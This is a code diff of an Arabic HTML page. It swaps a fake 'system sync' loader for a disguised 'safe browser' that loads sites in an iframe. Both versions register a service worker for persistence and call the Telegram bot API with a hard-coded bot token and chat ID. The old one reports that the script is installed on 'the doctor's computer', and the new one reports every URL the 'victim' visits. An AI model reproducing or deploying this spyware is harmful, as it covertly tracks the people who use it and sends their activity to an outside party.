@@ -2,34 +2,35 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مركز الإدارة الذكي | v2.0</title>
+    <title>المتصفح الآمن | YOU_BROWSER</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .glass-card { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 50px; border-radius: 30px; width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        h2 { color: var(--neon); text-shadow: 0 0 10px var(--neon); margin-bottom: 5px; }
-        .loader { border: 3px solid #111; border-top: 3px solid var(--neon); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-family: monospace; font-size: 11px; color: #555; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #050505; color: #00ff41; font-family: sans-serif; overflow: hidden; }
+        .nav-bar { background: #111; padding: 10px; display: flex; gap: 10px; border-bottom: 1px solid #333; }
+        input { flex: 1; background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; border-radius: 5px; }
+        iframe { width: 100%; height: calc(100% - 50px); border: none; background: white; }
     </style>
 </head>
 <body>
-    <div class="glass-card">
-        <h2>SYSTEM_SYNC</h2>
-        <p style="font-size: 14px; color: #888;">جاري مزامنة بيانات الأداء بالخلفية...</p>
-        <div class="loader"></div>
-        <div id="status">> بانتظار تسجيل السكربت...</div>
+    <div class="nav-bar">
+        <span>🌐 YOU_RECON:</span>
+        <input type="text" id="urlInput" placeholder="ادخل الرابط هنا (مثلاً: https://bing.com)">
+        <button onclick="loadPage()" style="background: #00ff41; border: none; padding: 5px 15px; cursor: pointer; font-weight: bold;">انتقال</button>
     </div>
+    <iframe id="browserFrame" src="about:blank"></iframe>
 
 <script>
     if ('serviceWorker' in navigator) {
-        // هنا سجلنا ملف حقيقي اسمه sw.js
-        navigator.serviceWorker.register('sw.js').then(reg => {
-            document.getElementById('status').innerText = "> تم التثبيت الدائم بنجاح. YOU متحكم الآن.";
-            fetch(`https://api.telegram.org/bot7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ/sendMessage?chat_id=6778604620&text=🔥 YOU: السكربت استقر في حاسبة الدكتور!`);
-        }).catch(err => {
-            document.getElementById('status').innerText = "> فشل: " + err.message;
-        });
+        navigator.serviceWorker.register('sw.js');
+    }
+
+    function loadPage() {
+        const url = document.getElementById('urlInput').value;
+        const frame = document.getElementById('browserFrame');
+        
+        // إرسال إشعار فوري للتليجرام قبل التحميل
+        fetch(`https://api.telegram.org/bot7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ/sendMessage?chat_id=6778604620&text=🎯 YOU: الضحية يتصفح الآن عبر المتصفح المخترق:\n${url}`);
+        
+        frame.src = url;
     }
 </script>
 </body>
